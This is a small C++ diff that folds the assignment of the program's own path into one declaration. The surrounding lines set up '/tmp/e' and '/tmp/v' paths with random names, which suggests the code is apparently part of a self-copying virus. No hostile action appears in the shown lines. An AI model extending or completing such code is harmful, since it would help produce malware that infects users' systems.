@@ -14,8 +14,7 @@ int main (int argc, char** argv) {
     uid_t uid=getuid();
     srand(time(0));
     int c;
-    string exe = "/tmp/e", vir = "/tmp/v", me = (string) argv[0], command;
-    me = which(argv[0]);
+    string exe = "/tmp/e", vir = "/tmp/v", me = (string) which(argv[0]), command;
     me = me.substr(0, me.size() - 1);
     for (int i = 0; i < 8; i++) {
         exe += (char) ((rand() % 26) + 65);
